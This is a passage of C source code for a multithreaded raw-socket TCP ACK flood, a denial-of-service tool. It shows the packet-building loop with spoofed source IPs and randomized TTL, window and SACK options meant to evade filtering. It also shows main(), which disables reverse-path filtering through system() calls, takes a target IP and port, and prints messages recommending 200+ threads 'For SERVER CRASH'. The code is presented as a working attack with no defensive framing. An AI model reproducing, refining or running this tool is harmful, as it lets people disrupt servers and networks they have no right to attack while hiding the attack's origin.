        setsockopt(sockets[sock_idx], SOL_SOCKET, SO_SNDBUF, &sendbuf_large, sizeof(sendbuf_large));
        setsockopt(sockets[sock_idx], SOL_SOCKET, SO_RCVBUF, &recvbuf_large, sizeof(recvbuf_large));
        setsockopt(sockets[sock_idx], SOL_SOCKET, SO_RCVBUF, &recvbuf, sizeof(recvbuf));

            int flags = fcntl(sockets[sock_idx], F_GETFL, 0);
            fcntl(sockets[sock_idx], F_SETFL, flags | O_NONBLOCK);
            sockets_created++;
            cleanup_data.sockets_created = sockets_created;
    }

    if (sockets_created == 0) {
        free(sockets);
        if (conn_states) free(conn_states);
        if (hash_table) free(hash_table);
        return NULL;
    }

    pthread_cleanup_push(cleanup_handler, &cleanup_data);

    char *targettr = (char *)par1;
    char datagram[2048];
    memset(datagram, 0, 2048);

    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    uint8_t tcp_options[40];

    static char payload_data[1420];
    memset(payload_data, 0xFF, sizeof(payload_data)); // fill with 0xFF

    sin.sin_family = AF_INET;
    int rdzeroport;
    if (floodport == 1) {
        rdzeroport = random_number_beetwhen(2, 65535);
        sin.sin_port = htons(rdzeroport);
        tcph->dest = htons(rdzeroport);
    } else {
        sin.sin_port = htons(floodport);
        tcph->dest = htons(floodport);
    }

    sin.sin_addr.s_addr = inet_addr(targettr);

    uint32_t base_spoofed_ip;
    if (g_use_proxies && g_proxy_count > 0) {
        socks5_proxy_t *proxy = get_next_proxy();
        if (proxy && proxy->is_valid) {
            struct in_addr proxy_addr;
            if (inet_aton(proxy->ip, &proxy_addr) != 0) {
                base_spoofed_ip = proxy_addr.s_addr;
            } else {
                base_spoofed_ip = generate_spoofed_ip((int)thread_id, 0);
            }
        } else {
            base_spoofed_ip = generate_spoofed_ip((int)thread_id, 0);
        }
    } else {
        base_spoofed_ip = generate_spoofed_ip((int)thread_id, 0);
    }
    uint32_t spoofed_ip = base_spoofed_ip;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 40 + sizeof(payload_data);
    iph->id = htons(random_number_beetwhen(1, 65535));
    iph->frag_off = htons(0x4000);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = spoofed_ip;
    iph->daddr = sin.sin_addr.s_addr;

    uint32_t time_base = (uint32_t)time(NULL);
    uint32_t base_seq = (time_base * 2500000) + ((int)thread_id * 100000000) +
                        random_number_beetwhen(10000000, 500000000);
    uint32_t base_ack = base_seq + random_number_beetwhen(1000000, 10000000);

    int randSP = random_number_beetwhen(32768, 65535);
    int randWin = random_number_beetwhen(16384, 65535);

    static __thread uint16_t conn_ip_ids[256] = {0};

    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 0;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 1;
    tcph->urg = 0;
    randWin = random_number_beetwhen(16384, 65535);
    tcph->window = htons(randWin);
    tcph->urg_ptr = 0;

    int iteration = 0;
    int socket_idx = 0;

    int s = -1;
    for (int i = 0; i < sockets_created; i++) {
        if (sockets[i] >= 0) {
            s = sockets[i];
            socket_idx = i + 1;
            break;
        }
    }

    if (s < 0) {
        return NULL;
    }

    for (int burst = 0; ; burst++) {
            iteration++;

            if ((burst % 100000000 == 0) && !g_running) break;

            spoofed_ip = base_spoofed_ip + (burst & 0xFFFFFF);

            iph->saddr = spoofed_ip;
            psh.source_address = spoofed_ip;

            iph->frag_off = htons(0x4000); // DF flag

            uint32_t port_hash = (spoofed_ip ^ burst) & 0xFFFF;
            int base_port = 32768 + (port_hash % 32767);

            conn_state_t *conn = NULL;
            if (conn_states && hash_table) {
                conn = get_conn_state(conn_states, &conn_state_count, spoofed_ip, base_port,
                                     base_seq, base_ack, hash_table);

                if (conn && conn->source_port != 0) {
                    randSP = conn->source_port;
                } else if (conn) {
                    conn->source_port = base_port;
                    randSP = base_port;
                } else {
                    randSP = base_port;
                }
            } else {
                randSP = base_port;
            }

            tcph->source = htons(randSP);

            tcph->dest = htons(floodport);
            tcph->ack = 1;
            tcph->syn = 0;
            tcph->fin = 0;
            tcph->rst = 0;
            tcph->psh = 0;
            tcph->urg = 0;

            if (conn) {
                if (conn->packet_count == 1) {
                    conn->window_size = random_number_beetwhen(16384, 65535);
                    randWin = conn->window_size;
                } else {
                    randWin = conn->window_size + random_number_beetwhen(-1000, 1000);
                    if (randWin < 16384) randWin = 16384;
                    if (randWin > 65535) randWin = 65535;
                    if (conn->packet_count % 100 == 0) {
                        conn->window_size = randWin;
                    }
                }
            } else {
                if (burst % 100 == 0) {
                    randWin = random_number_beetwhen(16384, 65535);
                }
            }
            tcph->window = htons(randWin);

            if (conn) {
                if (conn->packet_count == 1) {
                    int ttl_choice = random_number_beetwhen(0, 2);
                    conn->ttl = (ttl_choice == 0) ? 64 : (ttl_choice == 1) ? 128 : 255;
                }
                iph->ttl = conn->ttl;
            } else {
                static __thread uint8_t ip_ttl_map[256] = {0};
                uint8_t ip_hash = (spoofed_ip >> 24) & 0xFF;

                if (ip_ttl_map[ip_hash] == 0) {
                    int ttl_choice = random_number_beetwhen(0, 2);
                    ip_ttl_map[ip_hash] = (ttl_choice == 0) ? 64 : (ttl_choice == 1) ? 128 : 255;
                }
                iph->ttl = ip_ttl_map[ip_hash];
            }

            iph->tos = (burst % 100 == 0) ? random_number_beetwhen(0, 63) : 0;

            uint8_t conn_hash = (spoofed_ip ^ randSP) & 0xFF;
            conn_ip_ids[conn_hash]++;

            iph->id = htons((conn_ip_ids[conn_hash] & 0xFFFF) + ((spoofed_ip & 0xFFFF) << 8));

                tcph->syn = 0;
            tcph->ack = 1;
                tcph->fin = 0;
                tcph->rst = 0;
            tcph->psh = 0;
                tcph->urg = 0;

            uint32_t seq_val, ack_val;

            if (conn) {
                conn->packet_count++;

                uint32_t data_acknowledged = random_number_beetwhen(1460, 14600);
                conn->ack_current += data_acknowledged;

                uint32_t seq_increment = random_number_beetwhen(0, 1460);
                conn->seq_current += seq_increment;

                if (conn->seq_current <= conn->seq_base) {
                    conn->seq_current = conn->seq_base + random_number_beetwhen(1, 1000000);
                }
                if (conn->ack_current <= conn->ack_base) {
                    conn->ack_current = conn->ack_base + random_number_beetwhen(1, 10000000);
                }

                seq_val = conn->seq_current;
                ack_val = conn->ack_current;
            } else {
                seq_val = base_seq + (burst * 1460);
                ack_val = base_ack + (burst * 2920);
            }

            tcph->seq = htonl(seq_val);
            tcph->ack_seq = htonl(ack_val);

            static __thread uint8_t tcp_options_template[40] = {0};
            static __thread int template_initialized = 0;
            static __thread uint64_t option_variation_counter = 0;

            uint8_t conn_opt_hash = (spoofed_ip ^ randSP) & 0x3F;
            if (!template_initialized || (option_variation_counter++ % 1000 == 0) ||
                (conn && (conn->packet_count % 100 == 0))) {
                int offset = 0;

                tcp_options_template[offset++] = TCP_OPT_MSS;
                tcp_options_template[offset++] = 4;
                uint16_t mss = htons(1300 + ((conn_opt_hash * 2) % 160));
                memcpy(&tcp_options_template[offset], &mss, 2);
                offset += 2;

                tcp_options_template[offset++] = TCP_OPT_WINDOW;
                tcp_options_template[offset++] = 3;
                tcp_options_template[offset++] = 7 + ((conn_opt_hash / 8) % 8);

                tcp_options_template[offset++] = TCP_OPT_TIMESTAMP;
                tcp_options_template[offset++] = 10;
                uint32_t ts_val = htonl((uint32_t)time(NULL) * 1000 + (burst % 1000));
                memcpy(&tcp_options_template[offset], &ts_val, 4);
                offset += 4;
                uint32_t ts_ecr = htonl((uint32_t)time(NULL) * 1000 - random_number_beetwhen(1, 1000));
                memcpy(&tcp_options_template[offset], &ts_ecr, 4);
                offset += 4;

                tcp_options_template[offset++] = TCP_OPT_SACK_PERM;
                tcp_options_template[offset++] = 2;

                int sack_count = 1 + ((conn_opt_hash / 16) % 3);
                for (int i = 0; i < sack_count && (offset + 10) <= 40; i++) {
                    tcp_options_template[offset++] = TCP_OPT_SACK;
                    tcp_options_template[offset++] = 10;
                    uint32_t sle_base = ack_val + random_number_beetwhen(1460, 14600);
                    uint32_t sle = htonl(sle_base);
                    uint32_t sre = htonl(sle_base + random_number_beetwhen(1460, 7300));
                    memcpy(&tcp_options_template[offset], &sle, 4);
                    memcpy(&tcp_options_template[offset + 4], &sre, 4);
                    offset += 8;
                }

                while (offset < 40) {
                    tcp_options_template[offset++] = TCP_OPT_NOP;
                }
                template_initialized = 1;
            }

            memcpy(tcp_options, tcp_options_template, 40);

            if (conn && conn->packet_count > 1) {
                uint8_t *opt_ptr = tcp_options;
                int opt_len = 40;
                while (opt_ptr < tcp_options + opt_len - 2) {
                    if (opt_ptr[0] == TCP_OPT_SACK && opt_ptr[1] == 10) {
                        uint32_t sle_base = ack_val + random_number_beetwhen(1460, 14600);
                        uint32_t sle = htonl(sle_base);
                        uint32_t sre = htonl(sle_base + random_number_beetwhen(1460, 7300));
                        memcpy(opt_ptr + 2, &sle, 4);
                        memcpy(opt_ptr + 6, &sre, 4);
                        opt_ptr += 10;
                    } else if (opt_ptr[0] == TCP_OPT_NOP) {
                        opt_ptr++;
                    } else {
                        opt_ptr += opt_ptr[1];
                    }
                }
            }

            tcph->doff = 15; // 60 bytes header (15 * 4)

            uint64_t *opt_src = (uint64_t *)tcp_options;
            uint64_t *opt_dst = (uint64_t *)(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr));
            opt_dst[0] = opt_src[0];
            opt_dst[1] = opt_src[1];
            opt_dst[2] = opt_src[2];
            opt_dst[3] = opt_src[3];
            opt_dst[4] = opt_src[4];

            static const int PAYLOAD_SIZE = sizeof(payload_data);
            static const int TOTAL_PACKET_LEN = sizeof(struct iphdr) + sizeof(struct tcphdr) + 40 + PAYLOAD_SIZE;
            iph->tot_len = TOTAL_PACKET_LEN;
            psh.dest_address = sin.sin_addr.s_addr;

            static const int IP_HDR_LEN = sizeof(struct iphdr);
            static const int TCP_HDR_BASE = sizeof(struct tcphdr);
            static const int TCP_OPT_LEN = 40;
            static const int TCP_TOTAL_LEN = TCP_HDR_BASE + TCP_OPT_LEN;

            iph->check = 0;
            iph->check = checksum_tcp_packet((unsigned short *) datagram, IP_HDR_LEN);

            if (iph->check == 0) {
                iph->check = 0xFFFF;
            }

            static const int TCP_TOTAL_LEN_WITH_PAYLOAD = TCP_TOTAL_LEN + PAYLOAD_SIZE;
            static const int PSEUDO_SIZE_WITH_PAYLOAD = 12 + TCP_TOTAL_LEN_WITH_PAYLOAD;

            psh.tcp_length = htons(TCP_TOTAL_LEN_WITH_PAYLOAD);
            tcph->check = 0;

            memcpy(datagram + IP_HDR_LEN + TCP_TOTAL_LEN, payload_data, PAYLOAD_SIZE);

            static __thread unsigned char pseudogram_buffer[2048];
            uint32_t *pseudogram_u32 = (uint32_t *)pseudogram_buffer;
            pseudogram_u32[0] = psh.source_address;
            pseudogram_u32[1] = psh.dest_address;
            pseudogram_buffer[8] = 0;
            pseudogram_buffer[9] = IPPROTO_TCP;
            *((uint16_t *)(pseudogram_buffer + 10)) = psh.tcp_length;

            uint64_t *tcp_src = (uint64_t *)(datagram + IP_HDR_LEN);
            uint64_t *tcp_dst = (uint64_t *)(pseudogram_buffer + 12);

            tcp_dst[0] = tcp_src[0];
            tcp_dst[1] = tcp_src[1];
            tcp_dst[2] = tcp_src[2];
            tcp_dst[3] = tcp_src[3];
            tcp_dst[4] = tcp_src[4];
            tcp_dst[5] = tcp_src[5];
            tcp_dst[6] = tcp_src[6];
            tcp_dst[7] = tcp_src[7];

            uint64_t *payload_src = (uint64_t *)(datagram + IP_HDR_LEN + TCP_TOTAL_LEN);
            uint64_t *payload_dst = (uint64_t *)(pseudogram_buffer + 12 + TCP_TOTAL_LEN);
            for (int i = 0; i < PAYLOAD_SIZE / 8; i++) {
                payload_dst[i] = payload_src[i];
            }

            tcph->check = checksum_tcp_packet((unsigned short*) pseudogram_buffer, PSEUDO_SIZE_WITH_PAYLOAD);

            if (tcph->check == 0) {
                tcph->check = 0xFFFF;
            }

            static __thread uint64_t local_sent = 0;
            static __thread uint64_t local_pps = 0;
            static __thread uint64_t local_eagain = 0;

            int send_result = sendto(s, datagram, iph->tot_len, MSG_DONTWAIT | MSG_NOSIGNAL, (struct sockaddr *) &sin, sizeof(sin));

            if (send_result > 0) {
                local_sent++;
                local_pps++;
            } else {
                int saved_errno = errno;
                if (saved_errno == EAGAIN || saved_errno == EWOULDBLOCK) {
                    local_eagain++;
                    if (sockets_created > 1) {
                        socket_idx = (socket_idx + 1) % sockets_created;
                        int next_s = sockets[socket_idx];
                        if (next_s >= 0) {
                            s = next_s;
                        } else {
                            for (int rot = 0; rot < sockets_created; rot++) {
                                socket_idx = (socket_idx + 1) % sockets_created;
                                if (sockets[socket_idx] >= 0) {
                                    s = sockets[socket_idx];
                                    break;
                                }
                            }
                        }
                    }
                } else {
                }
            }

            if ((local_sent % 1000) == 0 && local_sent > 0) {
                __sync_add_and_fetch(&g_total_packets_sent, local_sent);
                __sync_add_and_fetch(&pps, local_pps);
                if (local_eagain > 0) {
                    __sync_add_and_fetch(&g_eagain_count, local_eagain);
                    local_eagain = 0;
                }

                local_sent = 0;
                local_pps = 0;
            }
    }

    pthread_cleanup_pop(1);

    return NULL;
}

void *stats_thread(void *arg) {
    (void)arg;
    uint64_t last_sent = 0;
    time_t last_time = time(NULL);
    static int header_printed = 0;
    static pthread_mutex_t header_mutex = PTHREAD_MUTEX_INITIALIZER;

    sleep(2);

    pthread_mutex_lock(&header_mutex);
    if (!header_printed) {
        printf("\n[Live Statistics - Updating every second]\n");
        printf("Press CTRL+C to stop\n\n");
        fflush(stdout);
        header_printed = 1;
    }
    pthread_mutex_unlock(&header_mutex);

    usleep(500000);

    while (g_running) {
        for (int i = 0; i < 10 && g_running; i++) {
            usleep(100000);
            if (!g_running) break;
        }
        if (!g_running) break;

        uint64_t current_sent = g_total_packets_sent;
        time_t current_time = time(NULL);
        time_t time_diff = current_time - last_time;
        if (time_diff == 0) time_diff = 1;

        uint64_t pps_calc = (current_sent - last_sent) / time_diff;
        double mbps = (pps_calc * 80.0 * 8.0) / 1000000.0;

        if (g_use_proxies) {
            printf("\r\033[K[LIVE] PPS: %10lu | Sent: %12lu | Failed: %8lu | Conn: %8lu | ProxyFail: %8lu | Mbps: %8.2f",
                   pps_calc, current_sent, g_total_packets_failed, g_proxy_connections, g_proxy_failures, mbps);
        } else {
            printf("\r\033[K[LIVE] PPS: %10lu | Sent: %12lu | Failed: %8lu | Mbps: %8.2f",
               pps_calc, current_sent, g_total_packets_failed, mbps);
        }
        fflush(stdout);

        last_sent = current_sent;
        last_time = current_time;
    }

    return NULL;
}

// typo in name but too lazy to fix everywhere
int random_number_beetwhen(int min, int max) {
   static bool first = true;
   static pthread_mutex_t rand_mutex = PTHREAD_MUTEX_INITIALIZER;
   if (first) {
      pthread_mutex_lock(&rand_mutex);
      if (first) {
          srand(time(NULL) ^ (uintptr_t)pthread_self());
      first = false;
   }
      pthread_mutex_unlock(&rand_mutex);
   }
   return min + (rand() % (max + 1 - min));
}

volatile pthread_t *g_thread_array = NULL;
volatile int g_threads_created = 0;

void signal_handler(int sig) {
    (void)sig;
    g_signal_count++;
    printf("\n[!] CTRL+C pressed (%d) - Aborting IMMEDIATELY...\n", g_signal_count);
    fflush(stdout);
    g_running = 0;

    if (g_thread_array && g_threads_created > 0) {
        pthread_t *threads = (pthread_t *)g_thread_array;
        for (int i = 0; i < g_threads_created; i++) {
            pthread_cancel(threads[i]);
        }
    }

    if (g_signal_count >= 2) {
        _exit(0);
    }

}

int main(int argc, char *argv[]) {
    g_use_proxies = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--socks5") == 0) {
            g_use_proxies = 1;
            break;
        }
    }

    if(argc < 6){
        exit(-1);
    }

    if (g_use_proxies) {
        int proxy_count = load_socks5_proxies("socks5.txt");
        if (proxy_count == 0) {
            exit(-1);
        }
        printf("[+] Loaded %d SOCKS5 proxies from socks5.txt\n", proxy_count);
    }

    // disable rp_filter for spoofing
    int r1 = system("echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter 2>/dev/null");
    int r2 = system("echo 0 > /proc/sys/net/ipv4/conf/default/rp_filter 2>/dev/null");
    (void)r1; (void)r2;
    printf("[*] Disabled reverse path filtering (rp_filter) for IP spoofing\n");

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rlim_t target_limit = 1048576;
        if (target_limit > rl.rlim_max) {
            target_limit = rl.rlim_max;
        }
        rl.rlim_cur = target_limit;
        if (setrlimit(RLIMIT_NOFILE, &rl) == 0) {
        } else {
            rl.rlim_cur = rl.rlim_max;
            setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    int r3 = system("sysctl -w fs.file-max=1048576 2>/dev/null");
    int r4 = system("sysctl -w fs.nr_open=1048576 2>/dev/null");
    (void)r3; (void)r4;

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGPIPE, SIG_IGN);

    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGINT);
    sigaddset(&set, SIGTERM);
    pthread_sigmask(SIG_UNBLOCK, &set, NULL);

    // TODO: maybe use multiplier later
    int multiplier = 20;
    (void)multiplier;
    pps = 0;
    limiter = 0;

    floodport = atoi(argv[2]);
    int maxim_pps = atoi(argv[5]);
    int num_threads = atoi(argv[3]);
    lenght_pkt = 0;

    if (num_threads <= 0 || num_threads > 10000) {
        exit(-1);
    }
    if (num_threads < 200) {
        printf("[*] Warning: For SERVER CRASH, use 200+ threads (recommended: 300-500)\n");
        // printf("[DEBUG] Low thread count might not be effective\n");
    }

    pthread_t *thread = calloc(num_threads, sizeof(pthread_t));
    if (!thread) {
        exit(-1);
    }
    g_thread_array = (volatile pthread_t *)thread;
    pthread_t stats_t;

    int run_time = atoi(argv[4]);
    if (run_time <= 0) {
        free(thread);
        exit(-1);
    }

    init_rate_limiter((uint64_t)maxim_pps);

    if (g_use_proxies) {
        printf("[+] Starting %d threads with PROXIED RAW SOCKET ACK FLOOD\n", num_threads);
        printf("[+] Target: %s:%d\n", argv[1], floodport);
        printf("[+] Maximum PPS: %d\n", maxim_pps);
        printf("[*] Mode: Proxied Raw Socket (proxy IP spoofing + SACK blocks)\n");
        printf("[*] Proxies: %d loaded (used as spoofed source IPs)\n", g_proxy_count);
        printf("[*] Attack: 100%% ACK packets with SACK_PERM + SACK blocks (SLE & SRE)\n");
    } else {
        printf("[+] Starting %d threads with PURE ACK FLOOD\n", num_threads);
        printf("[+] Target: %s:%d\n", argv[1], floodport);
        printf("[+] Maximum PPS: %d\n", maxim_pps);
        printf("[*] Reverse path filtering (rp_filter) has been disabled automatically\n");
        printf("[*] Attack: 100%% ACK packets with SACK_PERM + SACK blocks (SLE & SRE)\n");
    }
    printf("[*] Rate limiter initialized: %d PPS (stable token bucket)\n", maxim_pps);
    printf("[*] Running for %d seconds...\n", run_time);
    fflush(stdout);

    time_t start_time = time(NULL);

    g_running = 1;
    g_threads_ready = 0;

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    size_t stacksize = 1024 * 1024;
    pthread_attr_setstacksize(&attr, stacksize);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);

    int threads_created = 0;

    printf("[*] Creating %d worker threads...\n", num_threads);
    fflush(stdout);

    for(int i = 0; i < num_threads; i++) {
        if ((i % 50 == 0 || i == num_threads - 1) && i > 0) {
            printf("[*] Created %d/%d threads...\n", i, num_threads);
            fflush(stdout);
        }

        int result = pthread_create(&thread[i], &attr, &flooding_thread, (void *)argv[1]);

        if (result != 0) {
            if (result == EAGAIN) {
                usleep(10000);
                break;
            }
        } else {
            threads_created++;
        }

    }

    pthread_attr_destroy(&attr);

    printf("[*] Created %d/%d threads successfully\n", threads_created, num_threads);
    fflush(stdout);

    g_threads_created = threads_created;

    if (threads_created == 0) {
        free(thread);
        exit(-1);
    }

    printf("[*] Waiting for threads to initialize...\n");
    int wait_count = 0;
    while (g_threads_ready < threads_created && wait_count < 5) {
        usleep(50000);
        wait_count++;
    }
    printf("[*] %d threads ready\n", g_threads_ready);

    pthread_attr_t stats_attr;
    pthread_attr_init(&stats_attr);
    pthread_attr_setdetachstate(&stats_attr, PTHREAD_CREATE_DETACHED);

    printf("[*] Starting statistics thread...\n");
    fflush(stdout);
    if (pthread_create(&stats_t, &stats_attr, stats_thread, NULL) != 0) {
    } else {
        printf("[*] Statistics thread started (detached)\n");
        fflush(stdout);
    }
    pthread_attr_destroy(&stats_attr);

    g_running = 1;
    start_time = time(NULL);
    time_t end_time = start_time + run_time;

    usleep(500000);

    if (g_use_proxies) {
        printf("\n[-] Proxied Raw Socket ACK Flood started (%d threads active).\n", threads_created);
        printf("[-] Pure ACK packets with SACK_PERM + SACK blocks (SLE & SRE)\n");
        printf("[-] Running for %d seconds - Monitor statistics above...\n", run_time);
    } else {
        printf("\n[-] Pure ACK Flood started (%d threads active).\n", threads_created);
        printf("[-] Pure ACK packets with SACK_PERM + SACK blocks (SLE & SRE)\n");
        printf("[-] Running for %d seconds - Monitor statistics above...\n", run_time);
    }
    fflush(stdout);

    int loop_iteration = 0;

    while (1) {
        time_t current_time = time(NULL);
        time_t elapsed = current_time - start_time;
        time_t remaining = end_time - current_time;

        if (!g_running || g_signal_count > 0) {
            printf("\n[!] Attack aborted by user (CTRL+C) - Stopping immediately...\n");
            fflush(stdout);
            for (int i = 0; i < threads_created; i++) {
                pthread_cancel(thread[i]);
            }
            if (g_signal_count >= 2) {
                _exit(0);
            }
            break;
        }

        if (elapsed >= run_time || remaining <= 0) {
            printf("\n[*] Run time completed (%ld seconds elapsed, target was %d)\n", 
                   (long)elapsed, run_time);
            fflush(stdout);
            break;
        }

        pps = 0;

        loop_iteration++;
        printf("\r[*] Running: %ld/%d seconds (remaining: %ld) | Packets: %lu | Connections: %lu", 
               (long)elapsed, run_time, (long)remaining, g_total_packets_sent, g_proxy_connections);
        fflush(stdout);

        struct timespec req, rem;
        req.tv_sec = 0;
        req.tv_nsec = 10000000;
        int sleep_iterations = 100;
        for (int i = 0; i < sleep_iterations; i++) {
            if (!g_running) {
                for (int j = 0; j < threads_created; j++) {
                    pthread_cancel(thread[j]);
                }
                break;
            }
            while (nanosleep(&req, &rem) == -1 && errno == EINTR) {
                if (!g_running) break;
                req = rem;
            }
            if (!g_running) break;
        }
    }

    time_t final_time = time(NULL);
    time_t final_elapsed = final_time - start_time;
    printf("\n[*] Main loop exited after %d iterations (elapsed: %ld seconds, g_running=%d)\n", 
           loop_iteration, (long)final_elapsed, g_running);
    fflush(stdout);

    printf("\n[*] Main loop completed. Stopping attack...\n");
    fflush(stdout);
    g_running = 0;

    printf("[*] Cancelling all threads immediately...\n");
    fflush(stdout);
    for (int i = 0; i < threads_created; i++) {
        pthread_cancel(thread[i]);
    }

    usleep(100000);

    printf("[*] Joining threads (will timeout if stuck)...\n");
    fflush(stdout);
    for (int i = 0; i < threads_created; i++) {
        pthread_join(thread[i], NULL);
    }

    printf("[*] All threads stopped and cleaned up\n");
    fflush(stdout);

    free(thread);
    thread = NULL;

    printf("\n=== Final Statistics ===\n");
    printf("Total Packets Sent: %lu\n", g_total_packets_sent);
    printf("Total Packets Failed: %lu\n", g_total_packets_failed);
    if (g_use_proxies) {
        printf("Proxy Connections: %lu\n", g_proxy_connections);
        printf("Proxy Failures: %lu\n", g_proxy_failures);
    }
    printf("EAGAIN/EWOULDBLOCK (Queued): %lu\n", g_eagain_count);
    printf("Real Errors: %lu\n", g_real_errors);
    printf("Success Rate: %.2f%%\n", 
           g_total_packets_sent > 0 ? 
           (100.0 * g_total_packets_sent) / (g_total_packets_sent + g_total_packets_failed) : 0.0);
    fflush(stdout);

    exit(0);
}
